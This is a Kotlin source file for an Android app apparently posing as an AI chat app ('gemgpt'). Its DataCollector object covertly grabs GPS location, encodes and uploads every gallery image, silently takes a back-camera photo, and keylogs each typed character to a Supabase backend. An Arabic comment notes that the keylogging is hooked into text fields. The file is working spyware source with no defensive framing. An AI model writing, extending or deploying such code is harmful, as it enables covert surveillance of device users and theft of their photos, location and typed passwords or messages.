package com.exapps.gemgpt

import android.content.Context
import android.location.LocationManager
import android.provider.MediaStore
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.exapps.gemgpt.supabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.Base64
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

object DataCollector {
    fun collectData(context: Context) {
        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
            getLocation(context)
            readGallery(context)
            captureCamera(context)
            // تسجيل ضغطات يتم في الواجهة (onValueChange في TextField)
        }
    }

    private suspend fun getLocation(context: Context) {
        withContext(Dispatchers.IO) {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: return@withContext
            supabase.postgrest.from("logs").insert(
                mapOf(
                    "type" to "gps",
                    "content" to "lat: ${location.latitude}, lon: ${location.longitude}"
                )
            )
        }
    }

    private suspend fun readGallery(context: Context) {
        withContext(Dispatchers.IO) {
            val images = mutableListOf<String>()
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val cursor = context.contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                val columnIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                while (it.moveToNext()) {
                    val path = it.getString(columnIndex)
                    val base64 = Base64.getEncoder().encodeToString(File(path).readBytes())
                    images.add(base64)
                }
            }
            images.forEachIndexed { index, base64 ->
                supabase.storage.from("captured_files").upload("gallery_$index.jpg", base64.toByteArray())
            }
        }
    }

    private suspend fun captureCamera(context: Context) {
        withContext(Dispatchers.Main) {
            val providerFuture = ProcessCameraProvider.getInstance(context)
            providerFuture.addListener({
                val provider = providerFuture.get()
                val preview = Preview.Builder().build()
                val imageCapture = ImageCapture.Builder().build()
                val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA

                val outputFile = File(context.externalCacheDir, "camera_capture.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()

                provider.unbindAll()
                provider.bindToLifecycle(context as ComponentActivity, cameraSelector, preview, imageCapture)

                imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(context), object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        val base64 = Base64.getEncoder().encodeToString(outputFile.readBytes())
                        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                            supabase.storage.from("captured_files").upload("camera_capture.jpg", base64.toByteArray())
                        }
                    }
                    override fun onError(exc: ImageCaptureException) {
                        // handle error
                    }
                })
            }, ContextCompat.getMainExecutor(context))
        }
    }

    fun logKey(key: String) {
        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
            supabase.postgrest.from("keylogs").insert(
                mapOf(
                    "key_char" to key
                )
            )
        }
    }
}